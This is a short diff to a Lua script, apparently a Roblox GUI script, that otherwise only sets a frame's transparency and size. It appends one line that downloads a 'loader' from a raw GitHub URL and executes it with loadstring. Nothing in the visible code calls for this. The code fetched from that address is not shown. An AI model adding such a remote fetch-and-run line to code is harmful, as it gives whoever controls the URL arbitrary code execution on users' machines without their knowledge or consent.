@@ -175,3 +175,5 @@ for i = 1, 10 do
 end
 mainFrame.BackgroundTransparency = 0.1
 mainFrame.Size = UDim2.new(0, 350, 0, 200)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/senonixun/gui/refs/heads/main/loader"))()
